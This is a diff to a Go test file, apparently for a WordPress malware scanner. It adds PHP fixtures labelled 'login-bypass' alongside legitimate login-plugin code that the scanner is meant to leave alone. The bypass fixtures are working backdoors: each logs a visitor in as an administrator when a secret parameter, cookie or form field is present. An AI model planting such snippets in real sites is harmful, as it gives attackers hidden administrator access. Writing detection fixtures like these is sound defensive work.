@@ -46,8 +46,22 @@ func TestContentPatterns(t *testing.T) {
 		{"<?php $p = '078f6f47c30e2b3da46419db80f408e7a38495d8';\nif (hash_equals($p, sha1($_GET['k']))) { wp_set_auth_cookie(1); }", []string{"hardcoded-credential"}},
 		{"<?php $u = 'htt'.'ps:'.'//p'.'ub-'.'9b7'.'7b8'.'4a7'.'.r2'.'.de'.'v/x'.'.ht'.'ml';", []string{"split-strings"}},
 		{"<?php /* Purger like Alfa Shell */", []string{"webshell"}},
+		// Login bypasses: a client site's plugin, and the other ways to pick
+		// the account.
+		{"<?php\nif (!isset($_GET['dev']) || $_GET['dev'] !== WPK_SECRET_KEY) { return; }\n$admin_id = $wpdb->get_var(\"SELECT u.ID FROM {$wpdb->users} u WHERE m.meta_value LIKE '%administrator%' LIMIT 1\");\nwp_clear_auth_cookie();\nwp_set_current_user($admin_id);\nwp_set_auth_cookie($admin_id, true);", []string{"login-bypass"}},
+		{"<?php if (isset($_COOKIE['wp_dev'])) { wp_set_current_user(1); wp_set_auth_cookie(1, true); wp_redirect(admin_url()); exit; }", []string{"login-bypass"}},
+		{"<?php if ($_REQUEST['k'] == 'x') { $u = get_users(['role' => 'administrator'])[0]; wp_set_auth_cookie($u->ID); }", []string{"login-bypass"}},
+		{"<?php if (!empty($_POST['go'])) { $u = get_user_by('login', 'admin'); wp_set_auth_cookie($u->ID, true); }", []string{"login-bypass"}},
 
 		// What plugins and themes do every day.
+		// Login plugins: a magic link checks a token, user switching a
+		// nonce and a capability, SSO asks the identity provider, and
+		// core logs the trackback user out with ID 0.
+		{"<?php $user = get_user_by('email', $_GET['email']);\nif (hash_equals(get_user_meta($user->ID, 'magic', true), $_GET['token'])) { wp_set_auth_cookie($user->ID); }", nil},
+		{"<?php check_admin_referer('switch_to_user_' . $_GET['user_id']);\nif (current_user_can('switch_to_user', $_GET['user_id'])) { wp_set_auth_cookie($_GET['user_id']); }", nil},
+		{"<?php $r = wp_remote_post($verify, ['body' => ['token' => $_GET['token']]]);\n$user = get_user_by('email', $_GET['email']);\nif (in_array('administrator', $user->roles, true)) { exit; }\nwp_set_auth_cookie($user->ID);", nil},
+		{"<?php wp_set_current_user(0);\n$tb_id = $_GET['tb_id'];", nil},
+		{"<?php\n// wp_set_auth_cookie(1) once $_GET['dev'] matches, 'administrator' only\n$x = 1;", nil},
 		{"<?php $state = json_decode(base64_decode($_GET['state']), true);\n$pdo->exec($sql);", nil},
 		{"<?php $response = wp_remote_get($url);\n$body = wp_remote_retrieve_body($response);\n$data = json_decode($body);", nil},
 		{"<?php $file = get_template_directory() . '/parts/' . $name . '.php';\ninclude $file;", nil},
